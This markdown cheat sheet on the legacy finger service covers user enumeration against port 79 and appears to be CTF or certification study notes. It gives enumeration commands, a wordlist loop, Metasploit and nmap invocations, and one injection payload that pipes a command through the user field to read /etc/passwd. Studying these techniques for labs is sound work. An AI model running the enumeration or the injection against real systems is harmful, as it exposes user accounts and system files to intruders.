# finger — user information on port 79

> **Legacy Unix user lookup.** Still pops up on old systems and CTF boxes — useful for user enumeration.

**Install check:** `finger --help` (finger-client package)

---

## 🎯 Cheat-flow

```bash
finger @10.10.10.5                 # list all logged-in users (if 0@host style works)
finger root@10.10.10.5             # info about 'root'
finger user@10.10.10.5
finger -l user@host                # long format
```

---

## 🔑 Output fields

```
Login: root                Name: root
Directory: /root           Shell: /bin/bash
Last login Tue Jan ...
No mail.
No Plan.
```

Useful info: home directory, shell, last login, mail status, `.plan` / `.project` files.

---

## 📋 Recipes

```bash
# 1. User enumeration via wordlist
for u in $(cat users.txt); do
  finger $u@10.10.10.5 | grep -v "no such user"
done

# 2. Metasploit module
msfconsole -q -x 'use auxiliary/scanner/finger/finger_users; set RHOSTS 10.10.10.5; run; exit'

# 3. nmap NSE
nmap -p 79 --script finger 10.10.10.5
```

---

## 🐛 Classic vulnerability

**`finger '|/bin/cat /etc/passwd'@host`** — old cfingerd RCE trick; rarely works now but CEH theory still mentions it.

---

## ⚠️ Gotchas

- Service `fingerd` is almost never installed on modern Linux — Solaris/HP-UX/legacy only.
- Information disclosure risk: exposes usernames, idle time, login history → great for target lists.

---

## 🔗 Related

- [nmap](nmap.md) · [smtp-user-enum](smtp-user-enum.md) · [hydra](hydra.md)
